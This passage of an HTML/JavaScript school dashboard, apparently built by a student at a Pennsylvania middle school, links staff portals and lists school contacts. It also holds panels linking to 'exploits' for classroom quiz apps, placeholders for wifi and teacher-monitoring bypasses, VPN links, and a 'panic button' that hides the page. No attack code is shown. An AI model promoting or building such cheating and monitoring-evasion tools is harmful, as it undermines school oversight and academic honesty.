          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <!-- Placeholder for additional panels -->
    <div id="settingsPanel" class="info-panel">
      <h2>⚙️ Settings</h2>
      <p>Customization Options:</p>
      <!-- Placeholder for 15 settings -->
      <button class="setting-option">Theme Customization</button>
      <button class="setting-option">Profile Management</button>
      <button class="setting-option">Display Settings</button>
      <button class="setting-option">Sound Preferences</button>
      <button class="setting-option">Privacy Settings</button>
      <button class="setting-option">Account Security</button>
      <button class="setting-option">Notification Preferences</button>
      <button class="setting-option">Cache Management</button>
      <button class="setting-option">Font Scaling</button>
      <button class="setting-option">Language Options</button>
      <button class="setting-option">Backup Settings</button>
      <button class="setting-option">Integrations</button>
      <button class="setting-option">Advanced Options</button>
      <button class="setting-option">About System</button>
      <button class="setting-option">Reset Defaults</button>
    </div>

    <div id="factsPanel" class="info-panel">
      <h2>💡 Random Facts</h2>
      <p id="randomFact">Loading fact...</p>
    </div>

    <div id="quotesPanel" class="info-panel">
      <h2>💬 Daily Quotes</h2>
      <p id="dailyQuote">Loading quote...</p>
    </div>


    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <!-- Add more canvas controls -->
        <button id="changeCanvasColorBtn">🎨 Color</button>
        <input type="range" id="canvasStrokeWidth" min="1" max="10" value="2" title="Stroke Thickness">
        <button id="changeCanvasMaterialBtn">🔧 Brush Type</button> <!-- Placeholder for material -->
        <textarea id="canvasText" placeholder="Type text here..." rows="2" cols="30"></textarea>
        <button id="addCanvasTextBtn">Add Text</button>
        
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div>

  <script>
    // Global activity logs array
    window.activityLogs = [];

    // Helper to log actions (adds to global activityLogs array)
    function logAction(actionDescription, details = {}) {
        const now = new Date();
        const logEntry = {
            timestamp: now.toISOString(),
            action: actionDescription,
            ...details
        };
        window.activityLogs.push(logEntry);
        // console.log(`Logged: ${actionDescription}`, details); // for debugging
    }

    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initSearch();
        this.initLogDownloadButton();
        this.initMakePanelsDraggableAndResizable();
        this.initTools();
        this.initThemeDisplay(); // New function for themes panel
        this.fetchRandomFact(); // New function
        this.fetchDailyQuote(); // New function
        this.initActivityLogBtn(); // New function for activity log
        this.initLoginHistoryBtn(); // New function for login history
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        // Only run interval if the sessionTime element exists
        const sessionTimeElement = document.getElementById('sessionTime');
        if (sessionTimeElement) {
          sessionTimeElement.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
          setInterval(function() {
            sessionSeconds++;
            sessionTimeElement.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
          }, 1000);
        }
      },
      
      // Initialize real-time clock
      initClock: function() {
        const realTimeClock = document.getElementById('realTimeClock');
        const realDate = document.getElementById('realDate');

        if (realTimeClock && realDate) {
          function updateClock() {
            const now = new Date();
            // Check the state of the login screen toggle to apply consistently if it's inherited
            const is24hr = document.body.classList.contains('dashboard-body') && typeof is24HourFormat !== 'undefined' ? is24HourFormat : false;
            const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: !is24hr };
            const timeStr = now.toLocaleTimeString(undefined, options);
            const dateStr = now.toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' });

            realTimeClock.innerText = '🕒 ' + timeStr;
            realDate.innerText = '📅 ' + dateStr;
          }
          
          updateClock();
          setInterval(updateClock, 1000);
        }
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (calendar) {
          calendar.innerHTML = ''; 
          const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
          days.forEach(day => {
            const div = document.createElement('div');
            div.innerText = day;
            calendar.appendChild(div);
          });

          const date = new Date();
          const year = date.getFullYear();
          const month = date.getMonth();
          const today = date.getDate();

          const firstDay = new Date(year, month, 1).getDay();
          const lastDate = new Date(year, month + 1, 0).getDate();

          for (let i = 0; i < firstDay; i++) {
            const empty = document.createElement('div');
            calendar.appendChild(empty);
          }

          for (let i = 1; i <= lastDate; i++) {
            const cell = document.createElement('div');
            cell.innerText = i;
            if (i === today) cell.classList.add('today');
            calendar.appendChild(cell);
          }
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        if (themeBtn) {
          themeBtn.addEventListener('click', () => {
            logAction("Theme Toggled");
            document.body.classList.toggle('light-theme');
            if(document.body.classList.contains('light-theme')){
              themeBtn.innerText = '☀️ Light Mode';
            } else {
              themeBtn.innerText = '🌙 Dark Mode';
            }
          });
        }
      },
      
      // Initialize buttons (general ones)
      initButtons: function() {
        // Panic button (specific to dashboard)
        const panicBtn = document.getElementById('panicBtn');
        if (panicBtn) {
          panicBtn.addEventListener('click', () => {
            logAction("Panic Button Clicked");
            window.open('https://clever.com', '_blank');
          });
        }

        const restartBtn = document.getElementById('restartBtn');
        if (restartBtn) {
          restartBtn.addEventListener('click', () => {
            logAction("Restart Button Clicked");
            if(confirm('Are you sure you want to kill the page (restart)?')) {
              // This clears the page content. A true restart would reload.
              document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            }
          });
        }

        const fixIssuesBtn = document.getElementById('fixIssuesBtn');
        if (fixIssuesBtn) {
          fixIssuesBtn.addEventListener('click', () => {
            logAction("Fix Issues Button Clicked");
            alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          });
        }
        
        const fullScreenBtn = document.getElementById('fullScreenBtn');
        if (fullScreenBtn) {
          fullScreenBtn.addEventListener('click', () => {
            logAction("Fullscreen Button Clicked");
            if (!document.fullscreenElement) {
              document.documentElement.requestFullscreen().catch(err => {
                alert(`Error attempting to enable full-screen mode: ${err.message}`);
              });
            } else {
              document.exitFullscreen();
            }
          });
        }
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        const zoomInBtn = document.getElementById('zoomInBtn');
        const zoomOutBtn = document.getElementById('zoomOutBtn');

        function updateZoom(direction) {
          // Check if body zoom style is already set, otherwise use 1
          let currentZoom = parseFloat(document.body.style.zoom || '1');
          let newZoom = currentZoom;

          if (direction === 'in') {
            newZoom += zoomStep;
            if (newZoom > maxZoom) newZoom = maxZoom;
          } else if (direction === 'out') {
            newZoom -= zoomStep;
            if (newZoom < minZoom) newZoom = minZoom;
          }
          document.body.style.zoom = newZoom;
          logAction(`Zoom ${direction} Button Clicked`, { level: newZoom });
        }

        if (zoomInBtn) {
          zoomInBtn.addEventListener('click', () => {
            updateZoom('in');
          });
        }
        if (zoomOutBtn) {
          zoomOutBtn.addEventListener('click', () => {
            updateZoom('out');
          });
        }
      },
      
      // Initialize canvas for notes
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');

        // Ensure canvas elements exist
        if (!notesBtn || !canvasContainer || !mainGrid) return;

        notesBtn.addEventListener('click', () => {
          logAction("Notes Button Clicked");
          mainGrid.style.display = 'none';
          canvasContainer.style.display = 'block';
        });

        const closeCanvasBtn = document.getElementById('closeCanvasBtn');
        if (closeCanvasBtn) {
          closeCanvasBtn.addEventListener('click', () => {
            logAction("Close Notes Button Clicked");
            canvasContainer.style.display = 'none';
            mainGrid.style.display = 'flex';
          });
        }

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const changeCanvasColorBtn = document.getElementById('changeCanvasColorBtn');
        const canvasStrokeWidthInput = document.getElementById('canvasStrokeWidth');
        const addCanvasTextBtn = document.getElementById('addCanvasTextBtn');
        const canvasTextarea = document.getElementById('canvasText');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let currentLineColor = '#ff914d'; // Default color
        let currentLineWidth = 2; // Default thickness

        // Canvas Drawing Initialization
        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          ctx.strokeStyle = currentLineColor;
          ctx.lineWidth = currentLineWidth;
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round'; // Make corners rounded
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          ctx.strokeStyle = currentLineColor;
          ctx.lineWidth = currentLineWidth;
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round';
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) {
              drawing = false;
              logAction("Finished drawing stroke");
            }
          });
        });

        // Canvas Controls Event Listeners
        if (clearCanvasBtn) {
          clearCanvasBtn.addEventListener('click', () => {
            logAction("Clear Canvas Button Clicked");
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#fff'; // Reset background if it was drawn over
            ctx.fillRect(0, 0, canvas.width, canvas.height);
          });
        }

        // Add Text to Canvas
        if (addCanvasTextBtn && canvasTextarea) {
          addCanvasTextBtn.addEventListener('click', () => {
            const textToAdd = canvasTextarea.value;
            if (textToAdd) {
              logAction("Adding Text to Canvas", { text: textToAdd });
              ctx.fillStyle = currentLineColor; // Use current color for text
              ctx.font = `${currentLineWidth * 10}px 'Montserrat', sans-serif`; // Scale font size with thickness
              ctx.fillText(textToAdd, 20, 50); // Position text
              canvasTextarea.value = ''; // Clear textarea
            }
          });
        }

        // Change Brush Color
        if (changeCanvasColorBtn) {
          changeCanvasColorBtn.addEventListener('change', (e) => { // Assuming this should be an input type color
             // If it's a button, we'd need an input type="color" hidden and triggered by it
             // For simplicity, assume a button opens a color picker, or directly change color.
             // Let's add an input color picker and make the button trigger it.
             // Placeholder: let's make the button change to red for now.
             // For proper color picking, you'd need an <input type="color">
             const newColor = prompt("Enter new color (e.g., red, #ff0000):", currentLineColor);
             if(newColor) {
                 currentLineColor = newColor;
                 ctx.strokeStyle = currentLineColor; // Update context immediately
                 logAction("Canvas Color Changed", { color: currentLineColor });
             }
          });
        }
        // Implement a proper color picker
        // const colorInput = document.createElement('input');
        // colorInput.type = 'color';
        // colorInput.style.display = 'none';
        // changeCanvasColorBtn.parentNode.appendChild(colorInput);
        // changeCanvasColorBtn.addEventListener('click', () => colorInput.click());
        // colorInput.addEventListener('input', (e) => {
        //     currentLineColor = e.target.value;
        //     ctx.strokeStyle = currentLineColor;
        //     logAction("Canvas Color Changed", { color: currentLineColor });
        // });


        // Change Stroke Thickness
        if (canvasStrokeWidthInput) {
          canvasStrokeWidthInput.addEventListener('input', (e) => {
            currentLineWidth = parseInt(e.target.value, 10);
            ctx.lineWidth = currentLineWidth;
            logAction("Canvas Stroke Width Changed", { width: currentLineWidth });
          });
        }

        // Placeholder for Material/Brush Type
        const changeCanvasMaterialBtn = document.getElementById('changeCanvasMaterialBtn');
        if (changeCanvasMaterialBtn) {
            changeCanvasMaterialBtn.addEventListener('click', () => {
                // This could involve changing ctx.lineCap, ctx.lineJoin, or more complex brush shapes.
                logAction("Brush Type Button Clicked", { type: 'Placeholder' });
                alert("Brush type selection is a placeholder feature.");
            });
        }


        // Screenshot Button
        const screenshotBtn = document.getElementById('screenshotBtn');
        if (screenshotBtn) {
          screenshotBtn.addEventListener('click', () => {
            logAction("Screenshot Button Clicked");
            const elementToCapture = document.body; 
            html2canvas(elementToCapture).then(canvasImg => {
              const link = document.createElement('a');
              link.download = 'dashboard_screenshot.png';
              link.href = canvasImg.toDataURL('image/png');
              document.body.appendChild(link);
              link.click();
              document.body.removeChild(link);
            });
          });
        }
        
        const exportNotesBtn = document.getElementById('exportNotesBtn');
        if (exportNotesBtn) {
          exportNotesBtn.addEventListener('click', () => {
            logAction("Export Notes Button Clicked");
            const link = document.createElement('a');
            link.download = 'notes_canvas.png';
            link.href = canvas.toDataURL('image/png');
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
          });
        }

        // Toggle Sections Button
        const toggleSectionsBtn = document.getElementById('toggleSectionsBtn');
        if (toggleSectionsBtn) {
          toggleSectionsBtn.addEventListener('click', () => {
            logAction("Toggle Sections Button Clicked");
            if (mainGrid.style.display === 'none') {
              mainGrid.style.display = 'flex';
              toggleSectionsBtn.innerText = '⬆️ Toggle Sections';
            } else {
              mainGrid.style.display = 'none';
              toggleSectionsBtn.innerText = '⬇️ Toggle Sections';
            }
          });
        }
      },
      
      // Initialize panels display
      initPanels: function() {
        document.querySelectorAll('.info-panel, .ipad-content, .bypass-content').forEach(el => {
          el.style.display = 'none';
        });
      },
      
      // Initialize quick bar elements
      initQuickBar: function() {
        // Placeholder: elements are managed by other init functions or are static
      },
      
      // Search bar functionality
      initSearch: function() {
        const searchInput = document.getElementById('dashboardSearch');
        if (searchInput) {
          searchInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
              e.preventDefault();
              logAction("Dashboard Search Submitted", { query: searchInput.value });
              const query = searchInput.value.toLowerCase();
              let found = false;

              // Map queries to element IDs or actions
              if (query === 'calendar') {
                  document.getElementById('calendar')?.scrollIntoView({ behavior: 'smooth' });
                  found = true;
              } else if (query === 'notes' || query === 'canvas') {
                  document.getElementById('notesBtn')?.click(); // Triggers showing canvas
                  found = true;
              } else if (query.includes('updates') || query === 'changelog') {
                  const updatesBox = document.querySelector('#updatesNotifications .box:has(h2:contains("Updates"))'); // Requires CSS :has support, otherwise JS logic.
                  // Simple search for element with H2 containing "Updates"
                  document.querySelectorAll('.box h2').forEach(h2 => {
                    if (h2.textContent.toLowerCase().includes('updates') && h2.closest('.box')) {
                       h2.closest('.box').scrollIntoView({ behavior: 'smooth' });
                       found = true;
                    }
                  });
              } else if (query === 'wifi' || query === 'wifi info') {
                  dashboard.togglePanel('wifiPanel');
                  document.getElementById('wifiPanel')?.scrollIntoView({ behavior: 'smooth' });
                  found = true;
              } else if (query === 'settings' || query === 'options') {
                  dashboard.togglePanel('settingsPanel');
                  document.getElementById('settingsPanel')?.scrollIntoView({ behavior: 'smooth' });
                  found = true;
              } else if (query === 'timer') {
                  document.getElementById('timerBtn')?.click();
                  found = true;
              } else if (query === 'stopwatch') {
                  document.getElementById('stopwatchBtn')?.click();
                  found = true;
              }
              // Add more mappings here for other panels/features
              
              if (!found) {
                  alert('Section not found or no direct action available for "' + searchInput.value + '".');
              }
            }
          });
        }
      },
      
      // New Button: Download Activity Logs
      initLogDownloadButton: function() {
          const btn = document.getElementById('downloadActivityLogsBtn');
          if (btn) {
              btn.addEventListener('click', () => {
                  logAction("Download Activity Logs Button Clicked");
                  if (window.activityLogs && window.activityLogs.length > 0) {
                      const logString = JSON.stringify(window.activityLogs, null, 2);
                      const blob = new Blob([logString], { type: 'application/json' });
                      const url = URL.createObjectURL(blob);
                      const a = document.createElement('a');
                      a.href = url;
                      a.download = `activity_logs_${new Date().toISOString().replace(/[-T:]/g, '')}.json`;
                      document.body.appendChild(a);
                      a.click();
                      URL.revokeObjectURL(url);
                      document.body.removeChild(a);
                  } else {
                      alert('No activity logs to download.');
                  }
              });
          }
      },
      
      // Function to make panels draggable and resizable
      initMakePanelsDraggableAndResizable: function() {
          // This makes elements within .main-row draggable and resizable
          interact('.box')
              .draggable({
                  inertia: true,
                  autoScroll: true,
                  onmove: function (event) {
                      const target = event.target;
                      const x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
                      const y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;

                      target.style.transform = 'translate(' + x + 'px, ' + y + 'px)';
                      target.setAttribute('data-x', x);
                      target.setAttribute('data-y', y);
                      logAction("Panel Dragged", { panelId: target.querySelector('h2')?.innerText || 'Unknown', position: `${x},${y}` });
                  },
                  onend: function (event) {
                      // Finalize position to avoid transform interference
                      const target = event.target;
                      const x = (parseFloat(target.getAttribute('data-x')) || 0);
                      const y = (parseFloat(target.getAttribute('data-y')) || 0);
                      target.style.transform = 'translate(' + x + 'px, ' + y + 'px)'; // Ensure transform persists
                  }
              })
              .resizable({
                  // Define handles: '.se' represents south-east handle
                  // Custom handles defined below to keep the element clean
                  handles: '.handle', // This is a class we'll add to our handles
                  preserveAspectRatio: false,
                  style: {
                      // We use transform, so keep height/width applied to style transform
                      // This prevents elements from jumping if they have fixed sizes
                      // If an element's dimensions are explicitly set in CSS (e.g., px), these need careful handling.
                      // For now, let's modify the transform directly based on event.rect.width/height
                  },
                  modifiers: [
                      interact.modifiers.restrictSize({
                          min: { width: 200, height: 100 }
                      })
                  ],
                  autoScroll: true
              })
              .on('resizing', function (event) {
                  const target = event.target;
                  const x = (parseFloat(target.getAttribute('data-x')) || 0);
                  const y = (parseFloat(target.getAttribute('data-y')) || 0);

                  // Update the element's style based on the event rect
                  target.style.width = event.rect.width + 'px';
                  target.style.height = event.rect.height + 'px';

                  // Translate if resizing from top or left edge
                  target.style.transform = 'translate(' + x + 'px, ' + y + 'px)';

                  target.setAttribute('data-x', x);
                  target.setAttribute('data-y', y);
                  logAction("Panel Resized", { panelId: target.querySelector('h2')?.innerText || 'Unknown', size: `${event.rect.width}x${event.rect.height}` });
              });

          // Add resize handles to each .box element
          document.querySelectorAll('.main-row .box, #updatesNotifications .box').forEach(box => {
              if (!box.querySelector('.handle')) {
                  const handle = document.createElement('div');
                  handle.className = 'handle';
                  box.style.position = 'relative'; // Ensure relative positioning for the handle
                  box.appendChild(handle);
              }
          });
          
          // Initialize the position attributes for interact.js
          // If the panels are meant to be draggable, they should start with no transform
          document.querySelectorAll('.main-row .box, #updatesNotifications .box').forEach(panel => {
              panel.setAttribute('data-x', 0);
              panel.setAttribute('data-y', 0);
          });
      },
      
      // Panel toggle functions
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (panel) {
          const isHidden = panel.style.display === 'none';
          panel.style.display = isHidden ? 'block' : 'none';
          logAction(`Panel Toggled`, { panelId: panelId, state: isHidden ? 'visible' : 'hidden' });
        }
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (targetContent) {
          targetContent.style.display = 'block';
          logAction("iPad Content Shown", { contentType: contentId });
        }
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById(contentId + 'Bypass');
        if (targetContent) {
          targetContent.style.display = 'block';
          logAction("Bypass Content Shown", { contentType: contentId });
        }
      },

      // Initialize Tools (Timer, Stopwatch, etc.)
      initTools: function() {
          // Timer / Stopwatch Logic
          let timerInterval = null;
          let stopwatchInterval = null;
          let timerRunning = false;
          let stopwatchRunning = false;
          let timerSeconds = 0;
          let stopwatchSeconds = 0;

          const timerBtn = document.getElementById('timerBtn');
          const stopwatchBtn = document.getElementById('stopwatchBtn');
          const reminderBtn = document.getElementById('reminderBtn');

          // Helper for formatting time
          function formatTimeHMS(totalSeconds) {
              const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
